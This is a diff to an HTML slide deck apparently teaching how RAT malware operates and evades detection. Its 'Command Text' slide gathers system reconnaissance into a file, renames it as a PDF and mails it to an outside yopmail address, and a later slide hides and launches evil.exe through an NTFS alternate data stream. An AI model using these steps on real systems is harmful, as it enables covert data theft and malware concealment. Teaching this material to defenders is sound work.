@@ -60,6 +60,9 @@
 				</section>
 				<section>
 					<h2>Overview</h2>
+					<img src="resources/mandiant.jpg" style="float: right;"/><br />
+					
+					<div align="left">
 					<ul>
 						<li>RAT Design</li>
 						<li>Encryption</li>
@@ -67,11 +70,8 @@
 						<li>AntiVirus</li>
 						<li>Behavior</li>
 					</ul>
-				</section>
-				<section data-markdown data-separator="---">
-					MANDIANT report
-					VERIZON report
-
+					</div>
+					<img src="resources/verizon.jpg" align="center" />
 				</section>
 				<section>
 					<h2>RAT Design</h2>
@@ -124,7 +124,7 @@
 				<section>
 					<h2>Command Text</h2>
 					<pre>
-						<code data-trim>
+						<code data-trim class="stretch">
 ipconfig /all > %APPDATA%\info.txt
 net start >> %APPDATA%\info.txt
 tasklist /v >> %APPDATA%\info.txt
@@ -135,7 +135,8 @@ net use >> %APPDATA%\info.txt
 copy %APPDATA%\info.txt %APPDATA%\output.pdf
 del %APPDATA%\info.txt
 
-sendmail %APPDATA%\output.pdf Status Update “Jones, William E. wejones@yourorg.gov” 
+sendmail %APPDATA%\output.pdf Status Update 
+    “Jones, William E. wejones@yourorg.gov” 
 	itebaffe-836@yopmail.com smtp.yourorg.gov
 
 del %APPDATA%\output.pdf
@@ -171,7 +172,7 @@ del %APPDATA%\output.pdf
 				<section>
 					<h2>Hiding in Logs</h2>
 					<pre>
-						<code data-trim>
+						<code data-trim class="stretch">
 v-client-5b.sjc.dropbox.com
 snt-re3-9a.sjc.dropbox.com
 yn-in-f125.1e100.net
@@ -227,7 +228,24 @@ a2.twimg.com
 					</ul>
 				</section>
 				<section>
-					<h2>ADS Demo</h2>
+					<h2>So What?</h2>
+					<pre>
+						<code data-trim class="stretch">
+#notepad pcast-nitrd-report-2010.pdf:secret.txt
+						</code>
+					</pre>
+				</section>
+				<section>
+					<h2>What about this?</h2>
+					<pre>
+						<code data-trim class="stretch">
+
+#type evil.exe > notepad.exe:evil.exe
+
+#start notepad.exe:evil.exe
+
+						</code>
+					</pre>
 				</section>
 				<section>
 					<h2>Crude Image Stego: LSB</h2>
@@ -240,19 +258,20 @@ a2.twimg.com
 				</section>
 				<section>
 					<h2>Carrier Image</h2>
+					<img src="resources/farm01.jpg" style="float: right;"/>
+					<div align="left">
 					<ul>
 						<li>Image Data:</li>
 						<ul>
 							<li>Size: 2.1 MB</li>
-							<li>Dimensions: 3500 x 2343 px</li>
+							<li>Dimensions: <br />3500 x 2343 px</li>
 							<li>Resolution: 300 dpi</li>
 							<li>Bit Depth: 24</li>
 							<li>~ 8 Megapixel</li>
 						</ul>
-						<li>“Secret” Message: Welcome! Remember, things aren’t always what they seem.</li>
+						<li>“Secret” Message: <br />Welcome! Remember, <br />things aren’t always <br />what they seem.</li>
 					</ul>
-				</section>
-				<section data-background="resources/farm02.png">
+					</div>
 				</section>
 				<section>
 					<h2>LSB: How It Works</h2>
@@ -266,7 +285,8 @@ a2.twimg.com
 					<h2>LSB Blow Up</h2>
 					<img src="resources/lsb02.png" class="stretch"/>
 				</section>
-				<section data-background="resources/tcpjoke.png">
+				<section>
+					<img src="resources/tcpjoke.png" style="height:100%"/>
 				</section>
 				<section>
 					##Network Protocol Abuse
